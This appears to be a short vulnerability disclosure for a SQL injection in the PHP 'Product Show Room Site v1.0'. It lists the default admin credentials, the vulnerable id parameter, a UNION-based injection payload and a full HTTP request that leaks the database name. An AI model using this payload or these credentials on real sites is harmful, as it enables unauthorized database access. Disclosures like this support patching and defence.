# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/admin/categories/manage_field_order.php?id=

Vulnerability location: /psrs/admin/categories/manage_field_order.php?id=, id

Current database name: hsrs_db ,length is 7

[+] Payload: /psrs/admin/categories/manage_field_order.php?id=-1%27%20union%20select%201,2,database(),4,5,6,7,8--+ // Leak place ---> id

```sql
GET /psrs/admin/categories/manage_field_order.php?id=-1%27%20union%20select%201,2,database(),4,5,6,7,8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/171826607-34cef476-400f-489f-ae58-0a2821d030f7.png)

![image](https://user-images.githubusercontent.com/54017627/171826542-dc94d67d-b293-43cb-b54c-370d6009e29f.png)
